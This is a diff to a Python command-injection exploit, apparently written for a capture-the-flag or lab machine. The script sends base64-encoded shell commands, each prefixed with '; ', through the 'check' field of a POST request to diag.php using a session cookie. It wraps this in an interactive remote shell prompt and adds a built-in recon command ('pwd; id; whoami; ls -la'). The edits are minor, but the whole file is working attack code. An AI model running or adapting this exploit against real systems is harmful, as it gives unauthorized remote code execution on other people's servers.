@@ -6,7 +6,7 @@ parser.add_argument('rhost', help='Remote host IP')
 args = parser.parse_args()
 
 USERNAME='admin'
-PASSWORD=''		# Removed since box is still live. Put login password here.
+PASSWORD=''		# Removed since box is still active.
 
 def payload(t):
 	return base64.b64encode(('; '+t).encode()).decode()
@@ -30,7 +30,11 @@ def exploit():
 	if not args.cookie:
 		args.cookie='authBy0xMurphy'
 	while True:
-		i = input('RCE@'+args.rhost+'> ')
+		try:
+			i = input('RCE@'+args.rhost+'> ')
+		except:
+			print("Please use Python 3.x to run...")
+			break
 		if i=='exit':
 			break
 		if i.split()[0] == 'load':
@@ -50,7 +54,7 @@ exit 			-- quits the shell
 ===========================
 System Information
 ===========================""")
-			r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('pwd; whoami; id; ls -la')},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
+			r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('pwd; id; whoami; ls -la')},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
 		else:
 			r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload(i)},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
 		if '<title>Login</title>' in r.text:
